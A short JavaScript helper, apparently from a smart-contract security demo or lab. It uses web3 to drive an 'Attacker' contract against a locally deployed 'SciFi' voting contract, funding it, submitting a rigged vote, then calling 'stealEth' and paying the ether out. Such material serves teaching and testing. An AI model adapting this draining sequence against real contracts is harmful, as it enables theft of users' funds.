class AttackerHelper {
	constructor(AttackerContract, sciFiContract) {
		this.attackerContract = AttackerContract;
		this.sciFiContract = sciFiContract;
	}

	attackSciFi(web3, movieData) {
		return new Promise((resolve, reject) => {
			const {attackerContract, sciFiContract} = this;
			const hexMovieName = movieData.riggedName

			attackerContract.setProvider(web3.currentProvider)
			sciFiContract.setProvider(web3.currentProvider)

			// Declaring this for later so we can chain functions on Attacker.
			var AttackerInstance
			var SciFiInstance
			// Get accounts.
			return web3.eth.getAccounts((error, accounts) => {

				return sciFiContract.deployed().then((instance) => {
					SciFiInstance = instance
					return attackerContract.deployed().then((instance) => {
						AttackerInstance = instance

						return AttackerInstance.fundMe({from: accounts[0], gas:200000, value: web3.toWei(5,'ether')
						})
						.then((result) => {
							return AttackerInstance.setSciFiAddress(SciFiInstance.address, {from: accounts[0], gas:200000})
						})
						.then((result) => {
							return AttackerInstance.vote(hexMovieName, web3.toWei(5,'ether'),{from: accounts[0], gas:200000}).then((result) => {
								return AttackerInstance.stealEth({from: accounts[0], gas:200000}).then((result) => {
									return AttackerInstance.payOut(accounts[0],{from: accounts[0], gas:200000}).then((result) => {
									})
									.then(() => {
										resolve();
									})
								})
							})
						})
					})
				})
			})
		})
	}
}

export default AttackerHelper
